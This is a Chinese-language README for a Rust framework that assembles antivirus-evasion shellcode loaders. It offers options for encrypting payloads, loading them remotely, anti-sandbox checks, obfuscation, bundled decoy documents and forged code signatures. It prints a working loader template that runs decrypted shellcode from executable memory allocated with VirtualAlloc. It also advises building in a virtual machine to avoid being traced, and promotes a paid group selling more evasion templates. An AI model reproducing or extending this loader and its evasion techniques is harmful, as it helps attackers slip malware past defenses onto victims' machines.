## Myosotis-免杀框架-1.0.0

### 简介

本项目旨在实现免杀模板动态化、私有化，而不是直接提供一键生成免杀项目，需要使用人员本身具有一定的rust语言基础。

通过模块化一个完整loader的各个功能，自动组装模块生成免杀项目；

通过模块导入功能实现模块私有化，增加loader寿命。

### 更新功能

·模板分类

·进程注入路径自定义

·模板导入检测

### 编译环境

`rustc 1.83.0 (90b35a623 2024-11-26)`

### 项目结构

```
config:包含用户导入模板以及部分默认功能模板
output：项目输出
output.log:日志方便排查问题
```

### 项目功能

运行主程序选择相关参数，即可在`output`目录下生成rust项目

```
基础配置：
shellcode：各个远控生成的二进制shellcode(必选)
单体加载：生成单文件exe项目
分离加载：在项目目录下生成encryption.bin,使用时exe直接跟加密文件即可，可重命名
远程加载：填写远程加载url，在项目目录下会生成encryption.bin，然后将encryption.bin放到对应vps即可

代码配置：
代码分类用于对部分loader只支持特定系统以及进程注入的路径进行自定义
加载方式：主要是选择执行shellcode的模板(必选)
加密方式：选择对shellcode的加密方式(必选)
反虚拟机：反沙箱和分析等，也可以加入自己的小功能(可选、可多选)
花指令：增加代码混淆等(可选、可多选)

其他配置：
图标：exe图标(可选)
捆绑文件：需要释放的word或pdf等(可选)
伪造签名：利用签名复制工具sigthief实现(可选)
```

![主界面](https://github.com/user-attachments/assets/698401a7-a443-4d26-adaa-1b7aa397fe0e)


模板导入：

模板导入检测功能已更新，简单检测几个关键点,新增加载模板分类，主要为了对进程注入类注入进程进行自定义以及部分加载方式只适合单个架构的方式，如：Early Bird等

![模板导入](https://github.com/user-attachments/assets/f10b4b49-f4cd-4d66-a295-012084c4d77f)


### 模板导入说明

模板导入功能主要实现各种轮子的导入，导入模板需要满足下面内容

#### 加解密模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
base64 = "0.21"
```

加密模板：

需要将解密pub函数放到最前

需要导入主要代码，其中加密函数为`pub`，读取加密文件输出到`./encryption.bin`，输入文件以`#shellcodepath#`代替，注意这里需要r保证路径正确

例：	

```rust
use base64::encode;
use std::fs::File;
use std::io::{self, Read, Write};

pub fn base64_encrypt() -> io::Result<()> {
    // 硬编码的输入和输出路径
    let input_file = r"#shellcodepath#"; // 输入文件路径
    let output_file = "./encryption.bin"; // 输出文件路径

    // 读取文件内容
    let mut file = File::open(input_file)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    // 执行 base64 编码
    let encoded = encode(buffer);

    // 将编码后的数据写入输出文件
    let mut output = File::create(output_file)?;
    output.write_all(encoded.as_bytes())?;

    Ok(())
}
other...
```

解密模板：

需要将解密pub函数放到最前

方法需要为`pub`方法，函数输入输出需要固定为`input_data: &[u8]`和`Vec<u8>`

```rust
use base64::decode;
use std::fs::File;
use std::io::{self, Read};

pub fn base64_decrypt_to_shellcode(input_data: &[u8]) -> Vec<u8> {
    // 将 Base64 编码的数据解码为字节数组
    decode(input_data).expect("Failed to decode Base64")
}
other...
```

#### 加载模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
winapi = { version = "0.3.9", features = ["memoryapi", "winnt"] }
```

加载代码：

加载代码是唯一需要写main函数的模板，解密函数用`#encryption#`代替，输入字节内容用`#encryption_shellcode#`代替

当选择进程注入类时还需要用`#process_name#`代替进程名

```rust
use std::ptr::null_mut;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};

/// 分配可执行内存并运行 base
unsafe fn execute_base(base: &[u8]) {
    // 分配可执行内存
    let exec_mem = VirtualAlloc(
        null_mut(),
        base.len(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );

    if exec_mem.is_null() {
        panic!("Failed to allocate executable memory");
    }

    // 将 base 拷贝到分配的内存中
    std::ptr::copy_nonoverlapping(base.as_ptr(), exec_mem as *mut u8, base.len());

    // 创建指向 base 的函数指针
    let base_fn: extern "C" fn() = std::mem::transmute(exec_mem);

    // 执行 base
    base_fn();
}

fn main() {
    println!("Decoding and executing base...");

    let base_en: &[u8] =#encryption_shellcode#;
    // 解码 Base64 base
    let base = #encryption#(base_en);

    // 执行 base
    unsafe {
        execute_base(&base);
    }
}
```

#### 花指令模板和反虚拟机模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
rand = "0.8"  # 添加 rand crate 来支持随机数生成
```

代码模板：

只需要实现pub，无输入输出

```rust
use rand::Rng;
use std::{thread, time};

pub fn calculate_pi() -> f64 {
    let start_time = std::time::Instant::now();
    
    let mut inside_circle = 0;
    let total_points = 1_000_000_000;  // 总共生成的点数
    
    let mut rng = rand::thread_rng();

    // 计算直到运行大约10秒
    for i in 0..total_points {
        let x: f64 = rng.gen_range(0.0..1.0);
        let y: f64 = rng.gen_range(0.0..1.0);
        
        // 检查点是否在单位圆内
        if x * x + y * y <= 1.0 {
            inside_circle += 1;
        }

        // 检查是否达到约定的10秒
        if start_time.elapsed() >= time::Duration::new(10, 0) {
            break;
        }
    }

    // 计算圆周率
    let pi_approximation = 4.0 * (inside_circle as f64) / (total_points as f64);
    println!("近似计算的圆周率: {}", pi_approximation);
    pi_approximation
}
```

### 注意事项

模板名称不要包含特殊字符

导入库文件时不要使用换行如下

```rust
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
```

这会导致识别失败，同一个导入只占用一行



尽管已经去掉项目调试信息，但部分库仍然会将机器路径带到exe中，建议虚拟机使用谨防溯源

todo：

日志功能(🐕

动态密钥功能

链式加密模板

加载模板分类（🐕

系统架构细化处理（🐕

...



### 知识星球

如果你没有rust基础，我的知识星球内提供多个免杀模板和加密模板，并会持续维护，欢迎加入！

![知识星球](https://github.com/user-attachments/assets/4b22530f-e951-4760-baef-4552b830e186)


![知识星球2](https://github.com/user-attachments/assets/64e2b96b-6c1f-4d6b-912c-f94e394be9f0)

![海报](https://github.com/user-attachments/assets/303d031b-ade9-4849-8a07-db1ceb705a9a)
